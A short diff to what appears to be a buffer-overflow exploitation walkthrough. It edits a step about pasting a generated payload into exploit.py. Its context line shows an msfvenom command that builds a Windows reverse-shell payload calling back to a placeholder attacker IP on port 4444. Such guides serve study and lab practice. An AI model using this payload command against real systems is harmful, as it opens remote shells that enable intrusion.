@@ -174,7 +174,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=4444 EXITFUNC=thre
 ```
 
 #### Step 28: Paste generated payload into payload variable of exploit.py
-*Remove quotation marks "" and Wrap output/payload variable in parentheses ()*
+*Wrap output/payload variable in parentheses ()*
 
 #### Step 29: Add padding to exploit.py
 
